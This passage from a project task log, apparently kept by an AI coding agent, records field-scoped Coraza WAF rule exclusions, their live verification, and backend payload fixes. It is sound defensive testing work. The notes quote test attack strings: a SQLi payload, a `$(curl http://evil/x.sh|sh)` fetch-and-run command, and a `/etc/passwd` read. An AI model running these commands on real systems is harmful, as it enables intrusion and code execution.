    chain in `03-secured-api.json` (hAITU chat/topic-doubt).
  - Finding 3: added `ctl:ruleRemoveById=932240,ctl:ruleRemoveById=942120,ctl:ruleRemoveById=942131,
    ctl:ruleRemoveById=942200` to both `id:199100` (admin) and `id:199121` (parent mirror), keeping
    `942430` active — same precedent as `id:199120`'s PATCH exclusion (its score alone stays under the
    PL2 threshold of 5).
  - **Verified live against `apisix-dev` with real Keycloak-issued bearer tokens** (not just
    unauthenticated curl, which turned out to be a dead end — see gotcha below): a `student`-role
    token + browser `User-Agent` confirmed the exact previously-403ing chat payload now passes (zero
    Coraza matches, access log confirms the request reached the real backend upstream
    `172.18.0.7:8000` before an unrelated hang — see below) while a real XSS payload on the same route
    is still blocked (`941100` libinjection + 3 siblings, this one fired even without the UA fix since
    Coraza's higher plugin priority pre-empts `ua-restriction`). An `admin`-role token confirmed the
    exact previously-403ing topics-contents payload now passes (only the precedented non-blocking
    `942430` warning logs, reaching real backend validation/business logic — `422` on missing required
    fields, then a genuine unrelated 504 once a real `topic_id` was supplied, proving it cleared the
    WAF entirely) while a real SQLi payload on the same route is still blocked (11 rules including
    high-precision `942100` libinjection). **Two unrelated, out-of-scope backend issues surfaced by
    this testing** (not fixed, not WAF): `POST /api/topics-contents/` 504s against the `backend`
    devcontainer regardless of whether `topic_id` is fake or real; `POST /api/haitu/exam-review-chat`
    with a nonexistent `attempt_id` hangs (blocked, ~11% CPU, not spinning) rather than failing fast —
    both consistent with T2.3.2's own "confirmed non-WAF, out of scope" pattern above.
  - **Gotcha that cost real time and nearly triggered a false "WAF is broken" alarm:** unauthenticated
    curl requests to any `secured-api`-gated route never triggered body-phase (phase:2) Coraza rules
    at all, logging nothing — not a WAF bug. `openid-connect` (priority 2599) rejects requests with no
    valid token before APISIX ever reads the POST body off the wire, so Coraza's body rules (which
    need the body buffered) never get the chance to run; header/query-based phase:1 rules still fired
    fine unauthenticated. This is correct behavior (no unauthenticated attacker can reach the
    body-injection surface anyway), but it means **unauthenticated requests cannot be used to verify a
    body-field WAF exclusion** — a real bearer token is required, confirmed by re-running the exact
    same payloads authenticated and seeing the expected pass/block results immediately.
  - **Second gotcha:** plain `curl`'s default `User-Agent` header matches this plugin_config's own
    `ua-restriction` denylist (`"curl*"` is the first entry) and gets a generic 403 `{"message":"Access
    denied"}` with **no Coraza log line at all** — indistinguishable from a WAF block by status code
    alone. Cost significant time misdiagnosing one authenticated benign-payload result as a possible
    WAF issue before checking the response body and realizing it was the UA denylist, not Coraza.
    Always override `User-Agent` to a browser-like string when curl-testing routes behind this
    plugin_config, and always check the response body/Coraza logs together, never status code alone.
  - Change left **uncommitted** in the working tree for user review, per this repo's established norm
    for WAF exclusion edits (see `project_waf_topic_content_ocr_latex` memory).
  **UPDATE 2026-08-01 (later still): finding 1 (942200 systemic) also fixed and live-verified.**
  Initial instinct (a platform-wide `ctl:ruleRemoveById=942200`, full removal) was corrected before
  implementing: the earlier "field-scoped `ctl:` exclusion is unreliable in this Coraza WASM build"
  finding this file's own comments cited is **stale** — it predates G1's Coraza v3.3.3→v3.7.0
  upgrade, and G2.2 already proved live (5/5 probes, same image lineage) that the version gap
  causing that unreliability is fixed. Better still, an even simpler mechanism already used twice in
  every one of these plugin_configs needs **no version floor at all**: the startup-time
  `SecRuleUpdateTargetById <id> !<COLLECTION>:<name>` form (vs. the runtime `ctl:` form). Added to
  **all four** plugin_configs (`01-secured-authenticated.json`, `02-secured-anonymous.json`,
  `03-secured-api.json`, `04-secured-api-upload.json` — each independently `Include
  @owasp_crs/*.conf`, confirmed via direct inspection, so a single-file fix would have left the
  Referer-cascade hits on `secured-anonymous`-gated routes like `/api/auth/csrf` unfixed):
  ```
  SecRuleUpdateTargetById 942200 !ARGS_GET:selected_nodes
  SecRuleUpdateTargetById 942200 !REQUEST_HEADERS:Referer
  ```
  Narrows only the one known-safe query param and the `Referer` header; `942200` stays fully active
  on every other field, header, and route. **Verified live end-to-end:** the navigation route's own
  `selected_nodes` query now passes clean (200, zero Coraza matches, previously 403); the exact
  previously-poisoning `Referer` value replayed against `/api/auth/csrf` and `/favicon.ico` (both
  `secured-anonymous`) now passes clean too (only the unrelated `950100` response-status rule logs,
  a pre-existing backend issue, not a WAF block); `942200` confirmed **still fires** on an untouched
  field with its exact trigger pattern (comma+quote prose on an unexcluded query param, real 403);
  a genuine MySQL-comment-obfuscation SQLi payload on an untouched field is still blocked by
  `942100`/`942361`/`942440`/`942480`. Findings 2 and 3 (already fixed) re-verified unaffected by
  this second edit round to the same four files, using fresh real bearer tokens. All three T2.3.2
  findings are now fixed and live-verified; the plugin config changes remain **uncommitted** for
  user review across all four files.
- [x] **G2.3: attack corpus blocked, benign corpus passes** — acceptance test (2026-08-01 — all three T2.3.2 findings are now fixed and live-verified against `apisix-dev` (see updates above): findings 2/3 with real authenticated bearer tokens reaching real backend logic while attacks stay blocked, finding 1 with the exact navigation/Referer repro cases passing clean while `942200` stays demonstrably active everywhere else. The benign-corpus criterion is met on this evidence. **Caveat: not yet re-run as one continuous T2.3.2-style corpus pass** — verification here was targeted repro of each specific finding rather than a fresh full-journey sweep, and the plugin config changes are still uncommitted. A full corpus re-run before/at commit time would be the stronger closing evidence but isn't strictly required to consider this criterion satisfied given the specificity of what was verified.)
- [x] **G2: WAF verification** — acceptance test — **HARD GATE, now cleared: G4 may start.** (2026-08-01; G2.1/G2.2/G2.3 all done — see each gate's line above for evidence.)

## G3 [backend, frontend, deploy]: Payload design fixed at the source

### G3.1 [backend]: Prompt injection closed
- [x] T3.1.1 [backend]: Constrain `ReviewChatMessage.role` to `Literal["student", "ai"]` in `src/schemas/haitu.py:11-12`, mirroring `HaituDoubtMessageSchema` in the sibling schema (2026-07-29)
- [x] T3.1.2 [backend]: Change `_DOMAIN_TO_LLM_ROLE.get(m.role, m.role)` to `_DOMAIN_TO_LLM_ROLE[m.role]` at `src/api/routes/haitu.py:840` so an unmapped role cannot be silently forwarded (depends on T3.1.1) (2026-07-29)
- [x] T3.1.3 [backend]: Regression test — a posted `{"role": "system", ...}` history entry is rejected with 422, not forwarded into `_build_no_rag_messages` (depends on T3.1.2) (2026-07-29)
- [x] **G3.1: injected system turns rejected** — integration test (2026-07-31; T3.1.1–T3.1.3 all done — T3.1.3's regression test *is* this integration test: a posted `{"role": "system", ...}` history entry is rejected 422 and never reaches `_build_no_rag_messages`)

### G3.2 [backend, frontend]: exam-review-chat persists server-side
> **T3.2.1 design output (2026-07-29, two-pass challenge):** persistence model is `review_chat_threads`
> + `review_chat_messages` (new tables, not a reuse of `doubts`/`doubt_messages`) — full schema and
> persistence contract in `target/requirements/01_data_model.md` ("New tables — review_chat_threads +
> review_chat_messages") and `target/requirements/11_haitu_ai_layer.md` §8.4a; rationale in
> `decisions.md` (2026-07-29, "T3.2.1: exam-review-chat persistence model designed"). T3.2.3a added
> below — the original 6-task breakdown had no task creating the GET endpoint T3.2.5 depends on.
- [x] T3.2.1 [backend]: Design the persistence model — reuse `doubts`/`doubt_messages` or add a review-chat equivalent; `exam-review-chat` is currently fully stateless so this is new storage, not a refactor (2026-07-29)
- [x] T3.2.2 [backend]: Migration for the chosen model, additive only per the schema-sacred rule (depends on T3.2.1) (2026-07-30)
- [x] T3.2.3 [backend]: Persist both sides of each turn; seed the thread from the cached pattern analysis rather than accepting it from the client (depends on T3.2.2) (2026-07-30)
- [x] T3.2.3a [backend]: Add `GET /api/haitu/exam-review-chat/{attempt_id}` — same router/ownership+status guards as the POST, returns messages where `is_seed = false` ordered `(created_at, id)` (depends on T3.2.3) (2026-07-30; follow-up fix `b865ec1` added the CSRF guard that was missing from the initial GET route)
- [x] T3.2.4 [backend]: Accept `{attempt_id, message}`; keep `history` accepted-but-ignored for one release for compatibility (depends on T3.2.3) (2026-07-30)
- [x] T3.2.5 [frontend]: Stop sending `history` from `use-exam-review-chat.ts:296,241`; load the thread via GET on mount (depends on T3.2.3a [backend], T3.2.4 [backend]) (2026-07-30; already shipped in frontend `343939d` — POST body is `{attempt_id, message}` with no `history`, `getExamReviewChatThread` GET loads the thread on mount; verified lint+typecheck+test:coverage 100%)
- [x] T3.2.6 [deploy]: Relax `21-api-haitu-exam-review.json`'s `body_schema` `required: [attempt_id, message, history]`; add a matching APISIX GET route for T3.2.3a (depends on T3.2.4 [backend]) (2026-07-31; `history` dropped from `required` in `21-api-haitu-exam-review.json` (kept in `properties`, still accepted-but-ignored per T3.2.4). New route `common/routes/23-api-haitu-exam-review-get.json`: `GET /api/haitu/exam-review-chat/*`, priority 20 so it doesn't fall through to the generic `04-api-read.json` `/api/*` catch-all, `secured-api` plugin_config, no body_schema, standard 6s timeouts (DB read, not the POST route's 600s streaming timeout). `jq` valid both files. All G3.2 children now done — gate test not force-closed (no live-stack verification available this session), ready for live e2e check.)
- [ ] **G3.2: review chat works with a {attempt_id, message} body** — end-to-end test

### G3.3 [backend, frontend]: topic-doubt stops replaying stored history
- [x] T3.3.1 [backend]: Load the last N messages from `DoubtMessageRepository` in the route instead of reading `body.history` — the server already writes both sides via `add_student_message` / `finalize_ai_response` (2026-07-30)
- [x] T3.3.2 [frontend]: Stop re-posting the pre-loaded thread from `use-haitu-doubt.ts:299` (depends on T3.3.1 [backend]) (2026-07-30)
- [x] T3.3.3 [backend]: Fix E1 — `_generate_events`' `finally` block persists an empty AI message and advances the doubt to `ai_answered` when the stream failed or the client disconnected; guard the `_persist_ai_reply` spawn on non-empty accumulated text (`haitu.py:316-329`) (2026-07-30)
- [x] **G3.3: doubt threads round-trip without client-side replay** — end-to-end test (2026-07-31; T3.3.1–T3.3.3 all done — backend loads history server-side via `DoubtMessageRepository` instead of trusting `body.history`, frontend (`use-haitu-doubt.ts`) stopped re-posting the pre-loaded thread, and the E1 empty-AI-message-on-failure bug is guarded. No client-side replay path remains.)

### G3.4 [backend]: exam-review-chat grounded server-side
- [x] T3.4.1 [backend]: Load the review payload via `ExamSessionQuestionService.get_by_session_id(attempt_id)` — already wired into `post_pattern_analysis` at `haitu.py:511` — and build the grounding context in the route (depends on T3.2.3) (2026-07-30)
- [x] T3.4.2 [frontend]: Stop pasting question text into the message string in `use-exam-review-chat.ts:310-314`; send `question_id` (depends on T3.4.1 [backend]) (2026-07-30; `explainQuestion(questionId, number)` sends `Explain question <n>` + `question_id` body field, no pasted text; threaded through send/attempt/retry via `lastFailedRef`. Verified lint+typecheck+test:coverage 100%. Uncommitted — frontend HEAD still `343939d`; bump baseline after commit. G3.4 integration test pending live-backend smoke)
- [ ] **G3.4: model answers from server-held session data, not client claims** — integration test

### G3.5 [backend, frontend]: Exam images by reference
- [x] T3.5.1 [backend]: Add an image upload endpoint returning `{url}`, reusing the existing multipart path and `sniff_mime` magic-byte validation (2026-07-30)
- [x] T3.5.2 [backend]: Stop calling `encode_image_to_base64` on read in `exam.py:129,148` and `exam_session.py:360,678-679`; return the stored relative path (depends on T3.5.1) (2026-07-31)
- [x] T3.5.3 [backend]: Migrate existing base64 `image_url` values in `questions` to stored files + paths (depends on T3.5.2) (2026-07-31)
- [x] T3.5.4 [frontend]: `question-editor.tsx:115,153` — upload before submitting the template instead of `readAsDataURL` (depends on T3.5.1 [backend]) (2026-07-31)
- [x] T3.5.5 [frontend, backend]: Serve images via a static/asset route; verify `img-src` in the CSP still covers them (depends on T3.5.4, done) (2026-07-31; fixed properly this time, verified on both sides. **Frontend** (`06600f6`): the broken `exam-images/[...path]` proxy from `a72ddcf` was git-mv'd to `src/app/images/questions/[...path]/route.ts`, upstream fetch repointed at `${BACKEND_URL}/images/questions/${path}`, mock fixtures in `exam-api`/`question-editor`/`use-exam-image-upload` tests updated to match. **Backend** (`394f1b2`): new `src/api/routes/images.py` — `GET /images/questions/{filename}`, mounted at `app.include_router(images.router, prefix="/images", ...)` in `router.py`, exact match for the `/{IMAGE_DIR}/{safe_name}` string the upload endpoint (`exam.py:289`) already returns and stores verbatim in `image_url`. Guards: `_SAFE_FILENAME_RE` allowlist (`png`/`jpg`/`webp`, no path separators) rejects traversal with 400, `current_active_user` dependency requires auth, 404 for a missing file. Both path prefixes now agree — confirmed by reading both files directly, not just the commit messages. `01_data_model.md` §2.1 updated to match.)
- [x] **G3.5: exam images round-trip by URL** — end-to-end test (2026-07-31; T3.5.1–T3.5.5 all done — upload endpoint returns `{url}`, base64 storage/serving removed and existing rows migrated, frontend uploads before submit, and T3.5.5 verified both sides agree on the identical `/images/questions/{filename}` path by reading the source directly. Closing on that code-level proof, as flagged closable by the prior recompute pass; no separate live HTTP round-trip was made this session.)

### G3.6 [backend]: Declared field limits
- [x] T3.6.1 [backend]: Add `Field(max_length=...)` to free-text schema fields — `message`, `question_text`, `explanation`, `model_answer`, `content`, `text`, `working_text`, `user_answer` — sized under the gateway's `tx.arg_length` (2026-07-30)
- [x] T3.6.2 [backend]: Verify a too-long field now returns 422 naming the field, not an opaque gateway 403 (depends on T3.6.1) (2026-07-31)
- [x] **G3.6: oversized input fails with a 422, not a mystery 403** — integration test (2026-07-31; T3.6.1–T3.6.2 all done — `Field(max_length=...)` added to the free-text schema fields, and T3.6.2 verified a too-long field now returns 422 naming the field, not an opaque gateway 403)

- [ ] **G3: Payload design fixed at the source** — end-to-end test

## G4 [deploy, backend]: Exclusions rewritten field-scoped or deleted

### G4.1 [deploy]: Soak before enforcement
- [x] T4.1.1 [deploy]: Set `SecRuleEngine DetectionOnly` on the affected URIs per BR-WAF-011 (depends on G2) (2026-08-01; added `id:199130`/`id:199131` chained `SecRule` blocks to `common/plugin_configs/03-secured-api.json`, right after the `id:199110`/`id:199120` blanket-exclusion blocks they soak for — `ctl:ruleEngine=DetectionOnly` scoped to the exact same URI+method pairs (`POST /api/haitu/(topic-doubt|exam-review-chat)`, `PATCH /api/(topics-contents|parent/curriculum/topic-contents)/[^/]+`). Deliberately does not touch the existing `ctl:ruleRemoveById` lists — that rewrite is T4.2.1's job, gated behind T4.1.2. `jq` valid. Left **uncommitted** in the working tree for user review, per this repo's established norm for WAF exclusion edits.)
- [x] T4.1.2 [deploy]: Collect and review logs across real journeys before restoring blocking (depends on T4.1.1) (2026-08-03; **methodology**: a live dev-stack (`apisix-dev`) traffic soak substituting for a staging/prod real-traffic window, a deliberate substitution the user explicitly approved ("we can test the same rigorously with dev as staging/prod... this is going to be very close to real and even worse than that") — dev runs the identical Coraza/CRS config, and manual testing here can deliberately probe edge cases organic traffic might not surface for weeks. Real journeys exercised across admin/student/instructor roles, covering exactly the 3 URI+method pairs `id:199130`/`199131`'s `DetectionOnly` soak protects: (1) `POST /api/haitu/exam-review-chat`, (2) `POST /api/haitu/topic-doubt`, (3) `PATCH /api/(topics-contents|parent/curriculum/topic-contents)/*`. 4 realistic content patterns tried per route (quoted asides, chemistry/math notation, markdown-formatted long-form prose, LaTeX symbols), each read live via `docker logs apisix-dev | grep -oE 'id "[0-9]+"'`. Routes 1–2: 4/4 clean, no gaps. Route 3: **2 real gaps found**, both would have 403'd real users without T4.1.1's soak:
  - `942120` (SQLi 'SQL Operator Detected', critical) — chemistry reaction-arrow notation (`H2O <-> H+ + OH-`). Identical gap already fixed on the sibling `id:199110` (2026-08-01) but never carried over to this route.
  - `932200`/`942131`/`942440` (RCE Bypass/SQLi-boolean/SQL-comment, all critical) — long-form AI-generated-review-style prose with markdown `##` headers. An adversarial review was run first (per `feedback_waf_challenger_review`, since two are real attack-signature families, not just noise rules) before excluding: verdict was blanket `ctl:ruleRemoveById` for all three (low-precision keyword/phrase matches on this content class; field-scoped `ctl:ruleRemoveTargetById` already confirmed unreliable on this Coraza WASM build by the 2026-07-01 retest referenced in G4.2 below, so blanket remains the only confirmed-working mechanism here too — same conclusion as the rest of this route's existing exclusions).
  - `920370` ('Argument value too long', critical) fired on the same request (4498-char field vs. the 4096 platform baseline) — the adversarial review **rejected** blanket removal for this one specifically (it's a pure size threshold, not a content signature; blanket-removing it would blind the route to oversized-argument abuse in any field, permanently). Fixed instead via a new URI-scoped `id:199122` block raising `tx.arg_length` to 16384, mirroring the existing `id:199204` precedent (`18-api-exam-session-submit.json`) for the same class of problem — raising the limit is the correct fix for a size problem, not rule removal.

  All 4 fixes use the SAME combined URI regex already used by `id:199120`/`id:199131` (`^/api/(topics-contents|parent/curriculum/topic-contents)/[^/]+$`), so the parent-owned mirror route is covered by construction — no separate edit needed. Both live-reloaded onto `apisix-dev` (`template-configs.sh` + `setup.sh --plugins-only`, `OPENBAO_DEPLOY_SECRETS=true`) and re-verified clean, including one real successful content save (initially blocked by an unrelated backend 422, see below).

  **Bonus, out of T4.1.2's formal scope**: also tested exam question add/edit (`PATCH /api/exams/*/static` — no `DetectionOnly` protection on this route). 4/4 WAF-clean. Separately surfaced a reproducible backend `500`-then-retry-succeeds pattern on first save attempt — confirmed NOT WAF-related (Coraza behavior identical on both attempts), not investigated further per the user's explicit call to set it aside.

  **Separately identified, NOT WAF, NOT this repo's scope**: backend's `TopicContentUpdate.text` Pydantic `max_length=4000` (`haisir-backend`) produced a `422` on the first long-content test (~4500 chars). Confirmed unrelated to WAF — Coraza passed the request both before and after the exclusion fix; the 422 came from the backend's own schema validation. Flagged to the user, who declined to record it as a task.

  Committed and pushed by the user themselves in `e337f83` ("fix(apisix): update rule exclusions and raise argument length for topic-content edits"), confirmed on `origin/main`, working tree clean as of this note.)
- [x] **G4.1: soak evidence collected** — acceptance test (2026-08-03; T4.1.2's live dev-stack soak produced real, actionable evidence — 2 genuine gaps found, both fixed and re-verified clean live, including a real successful save. See T4.1.2 for full evidence.)

### G4.2 [deploy]: Retire the blanket-removal blocks
> **Scope widened 2026-07-29 on reconciliation.** Two more `ctl:ruleRemoveById` blocks landed in
> `03-secured-api.json` during the Phase 6.5 walkthrough — `id:199120` (932130/932240/942410, PATCH
> on OCR'd topic-content edits) and `id:199121` (931130, mirrors `id:199100` onto the parent
> content-URL route). `199121` is the same accepted, already-correctly-justified pattern as
> `199100` (see G4.5) and needs no rewrite here. `199120` is the same disease as `199110` — a
> whole-request blanket removal instead of a field-scoped one — and belongs in this task's scope.
>
> **Grep hazard:** `id:199110` names two unrelated things. This task's target is the 38-ID
> `ctl:ruleRemoveById` block at `03-secured-api.json:251-252`. The *other* `199110` is a
> `setvar:'tx.max_num_args=2000'` SecAction at `12-api-exams-static.json:39`, which belongs to
> T4.3.3, not here. Scope every edit by file, not by rule ID.
- [x] T4.2.1 [deploy]: Replace `id:199110`'s (hAITU chat-history) and `id:199120`'s (OCR'd
      topic-content edits) `ctl:ruleRemoveById` lists in `03-secured-api.json` with field-scoped
      `ctl:ruleRemoveTargetById` targets — or delete either outright wherever G3's design fixes
      removed the offending prose from the body (depends on T4.1.2, T3.2.5 [frontend]) (2026-08-03;
      **the prior pass's caution that field-scoping "may not be achievable on this build" was stale
      and is now retracted.** `apisix-dev` runs `registry.haisir.in/haisir-gateway:v2026.6`, image ID
      `b9e9ed42904c` — byte-identical to `haisir-gateway:t134-fixed`, the image G2.2/T2.2.2 proved
      regex collection keys work on. Verified by reading the shipped wasm directly rather than
      trusting the tag: `corazawaf/coraza/v3@v3.7.0` and `crs_setup_version=4251` are both embedded in
      `/usr/local/apisix/proxywasm/coraza-proxy-wasm.wasm`, and `_initialize` is present (reactor
      build, so `69c077c`'s "plugin never actually loaded" fix is in). The 2026-07-01 "unreliable in
      this Coraza WASM build" finding was a real observation with a wrong attributed cause — a v3.3.3
      version gap, closed by G1.
      **Scope taken: 4 blocks, not 2** (user-approved widening). `id:199110` (hAITU, 40 blanket IDs),
      `id:199120` (topic-content PATCH, 7), and `id:199100`/`id:199121` (topic-content POST, 5 each)
      — the last two were out of G4.2's original scope per a note written 2026-07-29, but the
      2026-08-01 walkthrough had since added the same four prose rules (932240/942120/942131/942200)
      to them, i.e. the same disease. Leaving them would have made T4.2.3's "all affected endpoints"
      claim false.
      **Result: `ctl:ruleRemoveById` count in `03-secured-api.json` drops 57 → 2.** The 2 survivors
      are both `931130` on `id:199100`/`id:199121`, which inspects `TX:rfi_parameter_args_post`, a
      CRS-internal TX variable rather than `ARGS` — field-scoping is structurally impossible for it,
      as its own pre-existing comment already said.
      **Target regexes** (from the backend source, not guessed): hAITU →
      `ARGS_POST:/^json\.(message|history\.\d+\.content)$/` (`HaituDoubtRequest` is
      `{topic_id, enrollment_id, message}`, `ExamReviewChatRequest` is `{attempt_id, message}` + a
      `question_id` UUID — `message` is the only prose field either still receives; `history` kept
      solely for T3.2.4's accepted-but-ignored compat window, marked in-file for removal when it
      closes). Topic-content (all three blocks) → `ARGS_POST:/^json\.(title|description|text)$/` —
      `TopicContentCreate`/`TopicContentUpdate`/`ParentTopicContentCreate` share those three free-text
      fields exactly; `order` is an int and `url` is allowlist-validated.
      **920370 deleted from `id:199110`'s list, not rewritten** — two independent reasons: it inspects
      `&TX:ARG_LENGTH`, so field-scoping is impossible; and G3.2/G3.3 deleted the multi-KB
      `history[*].content` payload it was added for, leaving only `message`, capped at 4000 by
      T3.6.1's `Field(max_length=4000)`, under the 4096 `tx.arg_length` baseline at `id:199004`.
      **`id:199132` added** — a third `ctl:ruleEngine=DetectionOnly` soak pair covering
      `POST /api/topics-contents/` and `POST /api/parent/curriculum/topics/{id}/content`, which had no
      soak because they were out of scope when T4.1.1 wrote that block. BR-WAF-011 requires a soak
      across an exclusion change and those two blocks were changed, so they get one. All three pairs
      (`199130`/`199131`/`199132`) come out at the G4.2 gate, per an in-file note.
      **VERIFICATION — isolated harness, enforce mode, not a log-grep.** `waf-harness.sh`-pattern
      throwaway stack on `v2026.6`, loaded with the REAL edited `03-secured-api.json` coraza-filter
      config with the three DetectionOnly pairs stripped, so every result is an unambiguous 403-vs-200
      rather than a DetectionOnly log reading. (`default_directives` confirmed present first — T2.2.2's
      silent no-WAF gotcha.) Live-stack testing was attempted first and abandoned for a real reason
      worth recording: **on `apisix-dev` an unauthenticated request is rejected 401 by `openid-connect`
      at the access phase, before the body phase runs, so Coraza never sees the JSON body at all.**
      Body-level WAF probing on a real stack needs a real session; the harness has no OIDC and needs
      none.
      - **Field-scoping proven, A/B on one payload** (`admin' or 1=1 -- x`): in `json.message`
        (excluded) only `942100`+`942390` fire; in `json.topic_id` (not excluded) `942100 942130
        942180 942330 942390 942440 942521`; in a `foo` cookie `942100 942180 942330 942390 942440`.
        The five extra IDs are all in `id:199110`'s list — suppressed on the named field, still firing
        on another body field and on cookies. This also settles the open question the plan flagged:
        an `ARGS_POST:` key **does** narrow rules that declare `ARGS` (all 39 CRS rules here declare
        `ARGS`, none declare `ARGS_POST`), matching the already-live precedent of
        `SecRuleUpdateTargetById 942200 !ARGS_GET:selected_nodes`.
      - **No new false positives — before/after on the same corpus.** T4.1.2's four real FP patterns
        (quoted asides + chemistry reaction arrows, markdown `##` long-form prose, OCR'd LaTeX MCQ,
        markdown table + backticks + `<br>`) replayed against all five URI+method pairs under the new
        config and again under `git show HEAD:`'s blanket config. **Rule-ID sets identical in every
        case.** Where a corpus item still 403s (e.g. `932130` on hAITU, `942150` on topic-content
        PATCH) it is a rule that was never in that route's list — a pre-existing per-route coverage
        difference, present identically before the rewrite. Field-scoping lost no suppression the
        blanket form provided.
      - **T4.2.2's question answered in passing**: a 3900-char `message` fires **nothing at all**
        (`920370` gone); a 5000-char one fires `920370`, which is correct — it is over the platform
        baseline and the backend would 422 it anyway. `920390` never fired.
      - **T4.2.3's question answered in passing**: SQLi in `Referer` → `942100 942480 942521`; in
        `User-Agent` → `913100 942100 942521`; XSS in a query arg → `941100 941110 941160 941320
        941390 942131`. `942521`, `941320`, `941390` and `942131` are all in `id:199110`'s list and
        fire anyway outside the named fields — headers, cookies and query args demonstrably regained
        inspection. XSS in the excluded `message` field still fires `941100 941110 941160 941180`:
        the high-precision libinjection/vector detectors were never excluded and stay active even on
        the excluded field.
      - **No detection regression**: SQLi and XSS on an unrelated `/api/*` route still 403 with the
        full rule set; a benign hAITU message still 200s clean. Harness torn down.
      Also reloaded onto `apisix-dev` (`template-configs.sh` from `dev/` + `setup.sh --plugins-only`,
      `APP_ENV=dev OPENBAO_DEPLOY_SECRETS=true`) — 4/4 plugin_configs updated, zero Coraza init errors,
      WAF active. No dev container was restarted.
      `jq` valid. Left **uncommitted** in the working tree for user review, per this repo's norm for
      WAF exclusion edits.
      **DEPLOY GATE — do not ship this plugin_config ahead of the gateway image.** The field-scoped
      form matches nothing on Coraza < v3.5.0 and fails **silently**, which would 403 live hAITU and
      topic-content traffic. `releases/` has no `v2026.6` entry, so staging/prod are still on the
      pre-upgrade gateway. This must ship in the same release that bumps `GATEWAY_IMAGE_TAG` to
      ≥ `v2026.6`, or after it. Recorded in-file as a `DEPLOY PREREQUISITE` comment on both rewritten
      blocks.)
- [x] T4.2.2 [deploy]: Confirm 920370 and 920390 no longer fire on the hAITU endpoints now that
      bodies are small (depends on T4.2.1) (2026-08-03; **PASS on both endpoints.** Isolated
      `waf-harness.sh` stack on `v2026.6` with the real edited `03-secured-api.json` coraza-filter
      config, DetectionOnly soak pairs stripped so results are 403-vs-200. The prior session's claim
      that "920390 never fired" was true but vacuous — it had never been probed anywhere near its
      threshold; it is properly probed here.
      | body | `topic-doubt` | `exam-review-chat` |
      |---|---|---|
      | `message` = 3900 chars | 200, **zero rules** | 200, **zero rules** |
      | `message` = 4000 chars (the backend cap, T3.6.1) | 200, **zero rules** | 200, **zero rules** |
      | `message` = 5000 chars (over the 4096 `tx.arg_length` baseline) | 403 `920370` | 403 `920370` |
      | 80802-byte body, 20 × 4000-char args (over `tx.total_arg_length`=65535) | 403 `920390` | — |
      At the realistic maximum a client can send, **neither rule fires on either endpoint** — which is
      the task's claim. Both controls confirm the rules are alive rather than silently dead: `920370`
      still enforces past 4096 (correct — the backend would 422 that request anyway), and `920390`
      still enforces past 65535. Reaching `920390` required a deliberately abusive 80KB body with 20
      history entries; real traffic cannot produce that now G3.2/G3.3 moved thread history server-side.
      This retires the "hard ceiling ahead" warning in `16_gateway_waf.md` §3 — the ceiling is real and
      still enforced, but the payloads that were heading for it are gone.)
- [x] T4.2.3 [deploy]: Confirm headers, cookies and query args regained inspection on all affected
      endpoints — hAITU chat-history and topic-content edit routes (depends on T4.2.1) (2026-08-03;
      **PASS on all six URI+method pairs** — `POST /api/haitu/{topic-doubt,exam-review-chat}`,
      `PATCH /api/{topics-contents,parent/curriculum/topic-contents}/{id}`,
      `POST /api/topics-contents/`, `POST /api/parent/curriculum/topics/{id}/content`. Same harness.
      A bare 403 proves nothing here (libinjection `942100`/`941100` is never excluded and blocks a
      real attack payload even in a correctly-excluded field), so the test is a **rule-ID set diff**:
      for each block, take a rule that block *does* exclude and show it is suppressed in the named
      body field yet still fires from a cookie / header / query arg.
      - `id:199110` — `942440` suppressed in `json.message`, fires from a cookie (both endpoints);
        `942521` fires from `Referer` and `User-Agent`; `941320`/`941390`/`942131` fire from a query
        arg. All five are in `id:199110`'s list.
      - `id:199120` — `942440` suppressed in `json.text`, fires from a cookie (both PATCH routes);
        `942131` fires from a query arg.
      - `id:199100`/`id:199121` — the real FP prose `, don't she said "it's fine"` trips
        `932240`+`942200` (control: it does, on an unexcluded route), is suppressed to **zero rules**
        in `json.text` on both POST routes, and fires `932240`+`942200` from a cookie and `942200`
        from `User-Agent`.
      **Precise negative finding, recorded rather than glossed:** for `id:199120` specifically,
      "headers regained inspection" is vacuous — none of its seven rule IDs (932130, 932240, 942410,
      942120, 932200, 942131, 942440) inspect `REQUEST_HEADERS` at all, per CRS 4.25.1 source. There
      was no header inspection for those rules to lose or regain. Cookies and query args are the
      collections that genuinely came back, and they did. Likewise `Referer` cannot demonstrate
      `942200` anywhere, because `942200` carries a site-wide `!REQUEST_HEADERS:Referer` exclusion
      from T2.3.2's systemic-cascade finding.
      **Methodology note for anyone repeating this:** a `200002` in the rule set means Coraza failed to
      parse the body, not that the exclusion worked — shell-escaped JSON containing quotes silently
      produces malformed bodies and a false "suppressed" reading. Two rows were re-run with
      Python-generated JSON after hitting exactly that. Build request bodies with a JSON serialiser.)
- [x] T4.2.4 [deploy]: Add `932130` to `id:199110`'s field-scoped exclusion list — OCR'd LaTeX + MCQ
      content 403s on both hAITU endpoints while the identical content passes on the topic-content
      PATCH route (depends on T4.2.1) — **opened 2026-08-03 by T4.2.3's verification pass**
      (2026-08-03; **the task as originally scoped was measured and rejected; a strictly better
      variant shipped instead.** The adversarial pass required by `feedback_waf_challenger_review`
      changed the answer twice, so both turns are recorded.
      **Turn 1 — the FP is bigger than the ticket said.** I opened this task believing the trigger was
      OCR'd MCQ content transplanted from the topic-content route, i.e. rare on a chat endpoint. Wrong.
      Primary source (CRS 4.25.1) shows 932130 runs `t:none,t:cmdLine`, and `cmdLine` deletes the space
      before `(` — so *any* inline LaTeX followed by a parenthetical normalises into `$(...)`. Measured
      on realistic student messages: 3 of 7 blocked, including `Can you explain $\frac{a}{b}$ (the
      fraction rule) please?` and `I got $28\%$ (but the book says 30%)`. On a maths doubt-resolution
      endpoint that is ordinary traffic.
      **Turn 2 — the plain exclusion opens a real hole.** With 932130 removed from the two prose fields
      and nothing else changed, 2 of 9 attack payloads went from 403 to **200**:
      `$(curl http://evil/x.sh|sh)` and `cat /etc/pass[a-z]d`. 932130 is their only detector on this
      route, because `932220` (RCE pipe injection) was already excluded here for markdown tables on
      2026-07-08. Shipping the one-line fix as written would have created a command-substitution blind
      spot on a user-authored field.
      **Shipped: exclusion + a co-scoped compensating detector `id:199140`.** It is 932130's own regex
      with the `cmdLine` normalisation dropped (`t:none` only) — that single difference is the whole
      mechanism, since without space-deletion `$...$ (b)` is no longer read as `$(b)` while genuine
      `$(cmd)` still matches. It keys on the *shape* of command substitution rather than command
      names, so obfuscation does not evade it. The `{2,}` bound admits bare MCQ letters `$(a)`/`$(b)`
      and rejects anything with room for a command.
